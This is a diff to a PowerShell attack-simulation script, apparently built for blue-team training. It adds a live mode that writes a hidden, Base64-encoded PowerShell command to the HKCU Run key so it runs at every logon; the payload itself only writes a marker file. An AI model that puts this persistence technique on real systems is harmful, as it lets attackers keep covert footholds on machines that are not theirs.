@@ -54,8 +54,11 @@ if (-not $PSBoundParameters.ContainsKey('LiveMode'))  { $LiveMode = $false }
 # Global State
 $Global:UniqueId = [System.Guid]::NewGuid().ToString().Substring(0, 8)
 $Global:C2Url = "http://${C2Server}:${C2Port}"
-$Global:DemoMode = $false
-$Global:LiveMode = $false
+# Normalize and assign mode switches (ensure booleans)
+$DemoMode = [bool]$DemoMode
+$LiveMode = [bool]$LiveMode
+$Global:DemoMode = $DemoMode
+$Global:LiveMode = $LiveMode
 
 # ===========================================================================
 # SETUP AND HELPER FUNCTIONS
@@ -238,10 +241,6 @@ return $result
 # TECHNIQUE 4: ENVIRONMENT VARIABLE ABUSE
 # Store payload in env vars (process-level, not persistent)
 # ==========================================================================
-# ==========================================================================
-# TECHNIQUE 4: ENVIRONMENT VARIABLE ABUSE
-# Store payload in env vars (process-level, not persistent)
-# ===============================================================================
 function Set-EnvPayload {
     Write-Host "[+] Technique 4: Environment Variable Payload Storage" -ForegroundColor Green
     
@@ -284,40 +283,49 @@ function Set-EnvPayload {
 # ==========================================================================
 # TECHNIQUE 7: PROCESS HOLLOWING CONCEPT
 # ==========================================================================
-# =========================================================================
-# TECHNIQUE 7: PROCESS HOLLOWING CONCEPT
-# ==============================================================================
-function Set-EnvPayload {
-    Write-Host "[+] Technique 7: Registry-Based Persistence (DEMO ONLY - Not Executed)" -ForegroundColor Green
+function Show-RegistryPersistence {
+   Write-Host "[+] Technique 7: Registry-Based Persistence (DEMO ONLY - Not Executed)" -ForegroundColor Green
 
-    # Define the payload command and its Base64 encoding
+    Write-Host "[+] Technique 5: Registry-Based Persistence" -ForegroundColor Green
+
+    $registryPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
+    $regKeyName = 'DemoApp'
+
+    # Payload to create an execution marker at user logon
     $payload = 'Add-Content -Path "C:\temp\execution_marker.txt" -Value "Successfully executed payload via Reg Run Key."'
     $encodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
+    $runValue = "powershell.exe -WindowStyle Hidden -EncodedCommand $encodedPayload"
 
-    # --- DEMO MODE ---
     if ($Global:DemoMode) {
-        Write-Host "    [*] Demonstrating registry-based persistence concepts:" -ForegroundColor Gray
-        Write-Host "    [*] HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -ForegroundColor Gray
-        Write-Host "    [*] Values here run commands at user logon" -ForegroundColor Gray
-        Write-Host ""
-        Write-Host "    [DEMO] Example commands (not executed):" -ForegroundColor Yellow
-        Write-Host "    Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'MyApp' -Value 'powershell.exe -WindowStyle Hidden -EncodedCommand <base64>'" -ForegroundColor DarkGray
-        Write-Host "    Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'MyApp'" -ForegroundColor DarkGray
+        Write-Host "    [*] Demonstrating registry-based persistence concepts (LOGGING ONLY):" -ForegroundColor Gray
+        Write-Host "    [*] Target key: $registryPath" -ForegroundColor Gray
+        Write-Host "    [*] Example Run value (not written):" -ForegroundColor Gray
+        Write-Host "      $runValue" -ForegroundColor DarkGray
         Write-Host "" 
-        Write-Host "    [DEMO] Blue Team should monitor Run keys for suspicious entries." -ForegroundColor Yellow
+        Write-Host "    [DEMO] Blue Team should monitor Run/RunOnce keys for suspicious entries." -ForegroundColor Yellow
     }
-    
-    # --- LIVE MODE (Actual Persistence) ---
-    if (-not $Global:DemoMode) {
-        $registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-        $regKeyName = "DemoApp"
-        
-        # Set the persistence key
-        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "$regKeyName" -Value "powershell.exe -WindowStyle Hidden -EncodedCommand $encodedPayload" -Type String -Force
-        Write-Host "    [LIVE] Successfully set registry persistence key: $registryPath\$regKeyName" -ForegroundColor Green
+    else {
+        # Ensure C:\temp exists so the payload can write to it at logon
+        if (-not (Test-Path -Path 'C:\temp')) {
+            try {
+                New-Item -Path 'C:\temp' -ItemType Directory -Force | Out-Null
+                Write-Host "    [LIVE] Created folder C:\temp" -ForegroundColor Green
+            }
+            catch {
+                Write-Error "    [!] Failed to create C:\temp: $($_.Exception.Message)"
+                return
+            }
+        }
+
+        try {
+            Set-ItemProperty -Path $registryPath -Name $regKeyName -Value $runValue -Type String -Force -ErrorAction Stop
+            Write-Host "    [LIVE] Successfully set registry persistence key: $registryPath\$regKeyName" -ForegroundColor Green
+        }
+        catch {
+            Write-Error "    [!] Failed to set registry key: $($_.Exception.Message)"
+        }
     }
 }
-
 
 function Show-WMIEventSub {
     Write-Host "[+] Technique 6: WMI Event Subscription (DEMO ONLY - Not Executed)" -ForegroundColor Green
@@ -426,22 +434,16 @@ function Start-Simulation {
 # SCRIPT ENTRY POINT
 # ==========================================================================
 
-# Check parameters
-if ($DemoMode -and -not $LiveMode) {
+# Check parameters and start
+if ($Global:LiveMode) {
+    Write-Host "==========================================================" -ForegroundColor DarkGray
+    Write-Host "          LIVE MODE ACTIVE" -ForegroundColor Red
+    Write-Host "==========================================================" -ForegroundColor DarkGray
+    Start-Simulation
+}
+else {
     Write-Host "==========================================================" -ForegroundColor DarkGray
     Write-Host "           DEMO MODE ACTIVE" -ForegroundColor Yellow
-    Write-Host "==========================================================" -ForegroundColor DarkGray
-    Start-Simulation
-} elseif ($Global:DemoMode -and $Global:LiveMode) {
-    Write-Host "==========================================================" -ForegroundColor DarkGray
-    Write-Host "          DEMO MODE AND LIVE MODE ARE BOTH ACTIVE           " -ForegroundColor Yellow
-    Write-Host "==========================================================" -ForegroundColor DarkGray
-    Start-Simulation
-} elseif ($Global:LiveMode) {
-    Start-Simulation
-} else {
-    Write-Host "==========================================================" -ForegroundColor DarkGray
-    Write-Host "           DEMO MODE ACTIVE" -ForegroundColor Green
     Write-Host "==========================================================" -ForegroundColor DarkGray
     Start-Simulation
 }
